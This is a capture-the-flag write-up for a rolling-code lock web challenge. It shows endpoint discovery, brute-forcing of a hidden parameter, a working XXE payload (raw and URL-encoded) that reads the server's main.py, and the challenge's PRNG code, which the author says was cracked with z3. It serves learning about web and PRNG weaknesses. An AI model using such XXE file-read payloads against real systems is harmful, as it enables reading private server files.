# Model E1337 - Rolling Code Lock
When we start the challenge we have a page with an input box that ask a code to unlock something.
## Flag 0
We start a dir search on the endpoint and we find the `/admin` endpoint, inspecting the source code we see:
```html
<body>
		<h1>Admin Panel</h1>
		<p>Lock location: <input type="text" name="location" value="Front door" disabled=""></p>
		<!-- We should be using get-config for this on the client side. -->
</body>
```
The hint is clear we have to see the `/get-config` endpoint, that give us and XML configuration file.
```xml
<body>
    <config>
        <location>Front door</location>
    </config>
</body>
```
I struggle a bit to understand how to proceed, but testing around I find that calling the endpoint `/set-config` gives back a Bad Request error.
So I try to brute force the params:
```batch
 arjun -u htp://xxx.xxx.xxx.xxx/xxxxx/set-config 
    _
   /_| _ '
  (  |/ /(//) v2.1.41
      _/

[*] Probing the target for stability
[*] Analysing HTTP response for anamolies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] name: data, factor: http code
```
Passing the data params seems to work, we have an XXE injection.
I try to understand the filesystem with many files and in the and I found the `main.py` in the same folder, and in the comment we have the first flag.
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY file SYSTEM "main.py" > ]><config><location>&file;</location></config>
```
Request urlencoded:
```
http://xx.xxx.xx.xxx/xxxxx/set-config?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%3C%21ENTITY%20file%20SYSTEM%20%22main.py%22%20%3E%20%5D%3E%3Cconfig%3E%3Clocation%3E%26file%3B%3C%2Flocation%3E%3C%2Fconfig%3E
```
## Flag 1
It's a flask server and we have an import to another file `rng.py` where we find how the generation of the random value works.
I try I bit to understand the logic behind the generation.
```python
def setup(seed):
        global state
        state = 0
        for i in range(16):
                cur = seed & 3
                seed >>= 2
                state = (state << 4) | ((state & 3) ^ cur)
                state |= cur << 2

def next(bits):
        global state

        ret = 0
        for i in range(bits):
                ret <<= 1
                ret |= state & 1
                state = (state << 1) ^ (state >> 61)
                state &= 0xFFFFFFFFFFFFFFFF
                state ^= 0xFFFFFFFFFFFFFFFF

                for j in range(0, 64, 4):
                        cur = (state >> j) & 0xF
                        cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
                        state ^= cur << j

        return ret

setup((random.randrange(0x10000) << 16) | random.randrange(0x10000))
```


We have 32 bit seed and a 64 bit state that is used to generate the next pseudo-random value.
I decide to try with symbolic resolution with z3. 
After modifying a bit the code I start to produce 1 error values and use it to reconstruct the seed, but it's seems that it's not enought.
Restarting the challenge and trying with 2 values we get the flag.
All the code is in the `x.py` file.

